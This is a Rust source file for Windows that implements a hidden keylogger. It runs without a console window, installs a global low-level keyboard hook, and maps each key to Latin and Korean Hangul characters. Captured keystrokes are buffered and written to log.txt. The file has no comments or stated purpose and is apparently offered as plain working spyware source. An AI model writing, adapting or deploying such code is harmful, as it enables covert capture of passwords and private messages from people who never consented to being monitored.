#![windows_subsystem = "windows"]

use std::{cell::RefCell, io::Write};

use windows::Win32::{
    Foundation::{BOOL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM},
    UI::{
        Input::KeyboardAndMouse::GetAsyncKeyState,
        WindowsAndMessaging::{
            CallNextHookEx, DispatchMessageA, GetMessageA, SetWindowsHookExW, TranslateMessage,
            UnhookWindowsHookEx, HC_ACTION, HOOKPROC, MSG, WH_KEYBOARD_LL,
        },
    },
};

static mut DATA: Option<RefCell<std::fs::File>> = None;
static mut BUF: String = String::new();
static mut GO: bool = true;

unsafe extern "system" fn callback(code: i32, wparam: WPARAM, laparam: LPARAM) -> LRESULT {
    if code == HC_ACTION.try_into().unwrap() {
        for now in (0x20..=0x20)
            .chain(0x0D..=0x0D)
            .chain(0x30..0x39)
            .chain(0x41..0x5A)
        {
            let space_status = GetAsyncKeyState(now);
            if space_status.leading_zeros() == 0 {
                // 0x8000
                let msg = match now {
                    0x20 => String::from("Space"),
                    0x0D => String::from("Enter"),
                    0x30..=0x39 => format!("{}", now - 0x30),
                    0x41..=0x5A => format!("{}", (now - 0x41 + 0x61) as u8 as char),
                    _ => break,
                };

                let plus = match now {
                    0x41 => String::from("ㅁ"),
                    0x42 => String::from("ㅠ"),
                    0x43 => String::from("ㅊ"),
                    0x44 => String::from("ㅇ"),
                    0x45 => String::from("ㄷ"),
                    0x46 => String::from("ㄹ"),
                    0x47 => String::from("ㅎ"),
                    0x48 => String::from("ㅗ"),
                    0x49 => String::from("ㅑ"),
                    0x4a => String::from("ㅓ"),
                    0x4b => String::from("ㅏ"),
                    0x4c => String::from("ㅣ"),
                    0x4d => String::from("ㅡ"),
                    0x4e => String::from("ㅜ"),
                    0x4f => String::from("ㅐ"),
                    0x50 => String::from("ㅔ"),
                    0x51 => String::from("ㅂ"),
                    0x52 => String::from("ㄱ"),
                    0x53 => String::from("ㄴ"),
                    0x54 => String::from("ㅅ"),
                    0x55 => String::from("ㅕ"),
                    0x56 => String::from("ㅍ"),
                    0x57 => String::from("ㅈ"),
                    0x58 => String::from("ㅌ"),
                    0x59 => String::from("ㅛ"),
                    0x5a => String::from("ㅋ"),
                    _ => String::new(),
                };

                BUF.push_str(msg.as_str());
                BUF.push_str(plus.as_str());
                BUF.push('\n');
                if BUF.len() > 100 {
                    let mut file = DATA.as_ref().unwrap().borrow_mut();
                    file.write_all(BUF.as_bytes()).unwrap();
                    file.flush().unwrap();
                    BUF.clear();
                }
                break;
            }
        }
    }
    CallNextHookEx(None, code, wparam, laparam)
}

const CALLBACK: HOOKPROC = Some(callback);

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let handle;
    unsafe {
        handle = SetWindowsHookExW(WH_KEYBOARD_LL, CALLBACK, HINSTANCE::default(), 0)?;
        DATA = Some(RefCell::new(std::fs::File::create("log.txt")?));

        let mut msg = MSG::default();
        while GO && GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        UnhookWindowsHookEx(handle);
    }
    Ok(())
}
